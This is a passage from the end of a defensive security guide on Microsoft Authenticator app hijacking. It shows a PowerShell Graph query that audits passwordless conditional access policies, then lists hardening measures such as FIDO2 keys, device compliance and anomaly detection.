Get-MgIdentityConditionalAccessPolicy | Where-Object { $_.DisplayName -like "*passwordless*" }
```

**Expected Output:**
```
@odata.type: #microsoft.graph.fido2AuthenticationMethod
Model: YubiKey 5

Conditional Access Policy: Block Passwordless Sign-In
State: enabled
```

---

## Summary

**Authenticator app hijacking represents a critical post-compromise attack vector.** Unlike credentials, an attacker who compromises the Authenticator gains the ability to approve authentication requests silently, appearing as though the legitimate user approved the login. This makes detection extremely difficult and allows long-term persistence.

**Defense requires multiple layers:**

1. **Hardware-backed MFA:** FIDO2 security keys resistant to device compromise.
2. **Device compliance:** Authenticator only on compliant, enrolled devices.
3. **Anomaly detection:** Alert on unusual approval locations/patterns.
4. **Passwordless restrictions:** Disable passwordless phone sign-in for non-critical users.
5. **Continuous authentication:** Require re-verification at regular intervals.

Organizations should prioritize **replacing software Authenticator with FIDO2 security keys** for high-value and administrative users, while enforcing strict device compliance policies for standard user Authenticator deployments.